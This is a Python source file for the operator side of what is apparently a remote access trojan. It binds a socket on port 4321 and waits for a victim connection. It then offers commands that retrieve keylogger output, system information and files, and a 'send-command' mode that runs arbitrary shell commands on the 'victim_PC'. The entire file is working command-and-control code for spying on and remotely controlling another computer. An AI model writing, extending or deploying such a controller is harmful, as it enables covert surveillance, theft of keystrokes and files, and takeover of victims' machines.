import socket

HOST = '127.0.0.1'
PORT = 4321

serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serv.bind((HOST, PORT))
serv.listen(5)

print('waiting for connection')
cnx, addr = serv.accept()
print('\n\nconnection established with ', addr, '\n')
print('type "get-commands" to see the available commands\n')


def addSpaceBetweenCommands():
    print('\n\n')


# infinite loop for user interaction

while True:
    command = input('Enter command: ')

    match command:
        case 'get-keylog':
            cnx.sendall(command.encode())
            data = cnx.recv(1024).decode()
            print(data)
            addSpaceBetweenCommands()

        case 'get-screenshot':
            print('not supported yet :(')
            addSpaceBetweenCommands()

        case 'get-info':
            cnx.sendall(command.encode())
            data = cnx.recv(1024).decode()
            print(data)
            addSpaceBetweenCommands()
        
        case 'get-file':
            cnx.sendall(command.encode())
            data = cnx.recv(1024).decode()
            print(data)
            addSpaceBetweenCommands()

        case 'send-command':
            cnx.sendall(command.encode())
            commandToExecute = input('victim_PC > ')
            cnx.sendall(commandToExecute.encode())
            data = cnx.recv(1024)
            print(data)
            addSpaceBetweenCommands()

        case 'get-commands':
            print('get-file\nget-info\nget-keylog\nget-screenshot\nsend-command\nget-commands\ndeconnecter')
            addSpaceBetweenCommands()

        case 'deconnecter':
            cnx.sendall(command.encode())
            cnx.close()
            print('connection closed')
            exit()